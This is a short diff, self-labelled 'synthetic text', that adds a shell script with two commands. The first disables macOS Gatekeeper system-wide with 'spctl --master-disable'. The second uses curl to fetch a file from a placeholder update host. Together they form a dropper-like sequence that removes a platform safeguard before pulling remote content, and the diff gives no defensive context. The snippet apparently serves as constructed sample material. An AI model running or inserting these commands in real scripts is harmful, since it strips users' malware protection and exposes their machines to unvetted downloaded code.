@@ -1,0 +1,4 @@
+#!/bin/sh
+# synthetic text
+spctl --master-disable
+curl -fsSL https://updates.example.invalid/x
